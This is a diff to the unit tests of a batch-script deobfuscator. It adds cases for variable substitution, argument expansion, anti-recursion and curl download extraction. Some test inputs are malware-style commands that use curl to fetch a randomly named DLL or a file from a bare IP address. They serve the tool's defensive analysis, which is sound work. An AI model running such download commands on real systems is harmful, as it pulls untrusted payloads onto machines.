@@ -157,6 +157,10 @@ class TestUnittests:
             ('set E^"E"X"P=43"', 'echo *%E"E"X"P%*', 'echo *43"*'),
             ('set E"E^"X"P=43"', 'echo *%E"E^"X"P%*', 'echo *43"*'),
             ("set ^|EXP=43", "echo *%|EXP%*", "echo *43*"),
+            ("set EXP=43", "echo *%EXP:/=\\%*", "echo *43*"),
+            ("set EXP=43/43", "echo *%EXP:/=\\%*", "echo *43\\43*"),
+            ("set EXP=43", "echo *%EXP:\\=/%*", "echo *43*"),
+            ("set EXP=43\\43", "echo *%EXP:\\=/%*", "echo *43/43*"),
             # TODO: Really, how should we handle that?
             # 'set ""EXP=43'
             # 'set'
@@ -335,24 +339,42 @@ class TestUnittests:
         assert deobfuscator.variables["'"] == "abbbc"
 
     @staticmethod
-    def test_args():
+    @pytest.mark.parametrize(
+        "cmd, result",
+        [
+            ("echo %0", "echo script.bat"),
+            ("echo %1", "echo "),
+            ("echo %~0", "echo script.bat"),
+            ("echo %~1", "echo "),
+            ("echo %~s0", "echo script.bat"),
+            ("echo %~s1", "echo "),
+            ("echo %~f0", "echo script.bat"),
+            ("echo %~f1", "echo "),
+            ("echo %~d0", "echo script.bat"),
+            ("echo %~d1", "echo "),
+            ("echo %~p0", "echo script.bat"),
+            ("echo %~p1", "echo "),
+            ("echo %~z0", "echo script.bat"),
+            ("echo %~z1", "echo "),
+            ("echo %~a0", "echo script.bat"),
+            ("echo %~a1", "echo "),
+            # ("echo %~xsa0", "echo script.bat"),
+            # ("echo %~xsa1", "echo "),
+            ("echo %3c%3%A", "echo cA"),
+            ("echo %3c%3%A%", "echo c"),
+            ("echo %*", "echo "),
+            ("echo %*a", "echo a"),
+        ],
+    )
+    def test_args(cmd, result):
         deobfuscator = BatchDeobfuscator()
 
-        cmd = "echo %0"
         res = deobfuscator.normalize_command(cmd)
-        assert res == "echo script.bat"
+        assert res == result
 
-        cmd = "echo %1"
-        res = deobfuscator.normalize_command(cmd)
-        assert res == "echo "
-
-        cmd = "echo %3c%3%A"
-        res = deobfuscator.normalize_command(cmd)
-        assert res == "echo cA"
-
-        cmd = "echo %3c%3%A%"
-        res = deobfuscator.normalize_command(cmd)
-        assert res == "echo c"
+    @staticmethod
+    def test_args_with_var():
+        deobfuscator = BatchDeobfuscator()
 
         cmd = "set A=123"
         deobfuscator.interpret_command(cmd)
@@ -470,6 +492,10 @@ class TestUnittests:
                 "curl.exe -o C:\\ProgramData\\output\\output.file 1.1.1.1/file.dat",
                 {"src": "1.1.1.1/file.dat", "dst": "C:\\ProgramData\\output\\output.file"},
             ),
+            (
+                'curl ""http://1.1.1.1/zazaz/p~~/Y98g~~/"" -o 9jXqQZQh.dll',
+                {"src": "http://1.1.1.1/zazaz/p~~/Y98g~~/", "dst": "9jXqQZQh.dll"},
+            ),
         ],
     )
     def test_interpret_curl(cmd, download_trait):
@@ -551,3 +577,33 @@ class TestUnittests:
         deobfuscator.interpret_command(cmd)
         assert len(deobfuscator.exec_ps1) == 1
         assert deobfuscator.exec_ps1[0] == rb"C:\ProgramData\x64\ISO\x64.ps1"
+
+    @staticmethod
+    def test_anti_recursivity():
+        deobfuscator = BatchDeobfuscator()
+        cmd = 'set "str=a"'
+        deobfuscator.interpret_command(cmd)
+
+        cmd = 'set "str=!str:"=\\"!"'
+        cmd2 = deobfuscator.normalize_command(cmd)
+        deobfuscator.interpret_command(cmd2)
+
+        cmd = "echo %str%"
+        cmd2 = deobfuscator.normalize_command(cmd)
+
+        assert cmd2 == "echo a"
+
+    @staticmethod
+    def test_anti_recursivity_with_quotes():
+        deobfuscator = BatchDeobfuscator()
+        cmd = 'set "str=a"a"'
+        deobfuscator.interpret_command(cmd)
+
+        cmd = 'set "str=!str:"=\\"!"'
+        cmd2 = deobfuscator.normalize_command(cmd)
+        deobfuscator.interpret_command(cmd2)
+
+        cmd = "echo %str%"
+        cmd2 = deobfuscator.normalize_command(cmd)
+
+        assert cmd2 == 'echo a\\"a'
